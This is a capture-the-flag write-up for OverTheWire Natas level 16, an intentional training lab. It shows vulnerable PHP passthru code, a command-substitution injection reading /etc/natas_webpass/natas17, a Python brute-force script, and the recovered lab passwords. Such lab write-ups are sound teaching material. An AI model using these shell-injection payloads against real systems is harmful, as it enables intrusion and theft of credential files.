# Level 16
## What does the page look like?
```html
$ curl -s --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Source code
```html
$ curl -s --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</
script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing:
 <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

This level is simimalr to [level 10](https://github.com/sebastiendamaye/overthewire/tree/master/Natas/level10) with a subtle difference though:

| level 10 | level 16 |
|---|---|
| `passthru("grep -i $key dictionary.txt");` | `passthru("grep -i \"$key\" dictionary.txt");`

This time, the user input is surrounded by double quotes.

## Concatenate files
Let's see if we can concatenate the file `/etc/natas_webpass/natas17` to our search as we did in [level 10](https://github.com/sebastiendamaye/overthewire/tree/master/Natas/level10):
~~~~
$ curl -s -d "flag /etc/natas_webpass/natas17&submit=Search" --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org | html2text 

****** natas16 ******
For security reasons, we now filter even more on certain characters

Find words containing: [needle              ][Search]

Output:
View_sourcecode
~~~~

No, it doesn't work this time, we'll need something else.

## Brute force
I noticed that sending `$(grep a /etc/natas_webpass/natas17)` is showing the entire entries of the dictionary.

Playing a bit locally on my machine, I noticed I could do as follows to brute force the password.
~~~~
$ grep -i "wrongly$(grep ^thisisthefla flag.txt)" dictionary.txt
$ grep -i "wrongly$(grep ^thisistheflz flag.txt)" dictionary.txt
wrongly
~~~~

The 1st command returns nothing because the beginning of the guessed password is correct. On the other hand, the 2nd command returns `wrongly` (this is one of the unique words I chose from the dictionary) and indicates that the beginning of the guessed password is incorrect.

Let's write a python script to brute force our password
```python
#!/usr/bin/env python
import requests

auth_user = 'natas16'
auth_pwd = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
target = "http://natas16.natas.labs.overthewire.org"

password = ''

# we know the password is 32 chars long
for pos in range(33):
	for i in range(48,123):
		# only test a-z, A-Z and 0-9
		if (i>47 and i<58) or (i>64 and i<91) or (i>96):
			payload = {
				'needle': 'wrongly$(grep ^%s%s /etc/natas_webpass/natas17)' % (password, chr(i)),
				'submit': 'Search'
				}
			r = requests.get(
				target,
				auth=requests.auth.HTTPBasicAuth(auth_user, auth_pwd),
				params=payload
				)
			if "wrongly" not in r.text:
				password += chr(i)
				print(password)
				break
```
Here is the output:
~~~~
$ python bruteforce.py 
8
8P
8Ps
8Ps3
8Ps3H
8Ps3H0
8Ps3H0G
8Ps3H0GW
8Ps3H0GWb
8Ps3H0GWbn
8Ps3H0GWbn5
8Ps3H0GWbn5r
8Ps3H0GWbn5rd
8Ps3H0GWbn5rd9
8Ps3H0GWbn5rd9S
8Ps3H0GWbn5rd9S7
8Ps3H0GWbn5rd9S7G
8Ps3H0GWbn5rd9S7Gm
8Ps3H0GWbn5rd9S7GmA
8Ps3H0GWbn5rd9S7GmAd
8Ps3H0GWbn5rd9S7GmAdg
8Ps3H0GWbn5rd9S7GmAdgQ
8Ps3H0GWbn5rd9S7GmAdgQN
8Ps3H0GWbn5rd9S7GmAdgQNd
8Ps3H0GWbn5rd9S7GmAdgQNdk
8Ps3H0GWbn5rd9S7GmAdgQNdkh
8Ps3H0GWbn5rd9S7GmAdgQNdkhP
8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
~~~~

# Flag
~~~~
natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
~~~~
